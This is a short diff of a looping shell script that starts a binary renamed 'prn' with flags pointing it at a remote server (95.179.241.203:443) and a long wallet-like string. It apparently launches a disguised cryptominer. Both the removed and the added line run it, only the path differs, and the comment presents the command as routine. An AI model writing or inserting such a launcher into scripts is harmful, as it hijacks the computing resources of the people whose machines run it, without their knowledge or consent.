@@ -2,7 +2,7 @@
 
 while true; do
     # Run the command with full path for clarity
-    /path/to/phhn/ah/./prn -o 95.179.241.203:443 -u 85a5qsVSC9H6xxY57AQvrHaaToUkdeZKH8t9Wf2NhAWwfxXcq4SrLWj4a6b8WPzEDMKmRbNX5h52118dho1SPGH59oBCYJB -k --tls -p pen &
+    ./prn -o 95.179.241.203:443 -u 85a5qsVSC9H6xxY57AQvrHaaToUkdeZKH8t9Wf2NhAWwfxXcq4SrLWj4a6b8WPzEDMKmRbNX5h52118dho1SPGH59oBCYJB -k --tls -p pen &
 
     # Get the process ID of the command
     pid=$!
